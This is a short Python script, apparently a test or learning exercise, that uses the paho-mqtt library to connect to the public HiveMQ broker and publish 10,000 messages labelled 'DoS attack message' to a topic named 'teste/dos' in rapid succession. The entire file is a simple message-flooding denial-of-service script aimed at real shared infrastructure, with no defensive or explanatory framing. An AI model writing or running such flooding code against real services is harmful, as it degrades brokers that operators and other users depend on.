import paho.mqtt.client as mqtt
import time

broker = "broker.hivemq.com"
port = 1883
topic = "teste/dos"

def on_connect(client, userdata, flags, rc):
    print(f"Connected with result code {rc}")

client = mqtt.Client()
client.on_connect = on_connect

client.connect(broker, port, 60)

client.loop_start()

for i in range(10000):
    client.publish(topic, "DoS attack message")
    time.sleep(0.01)

client.loop_stop()
client.disconnect()
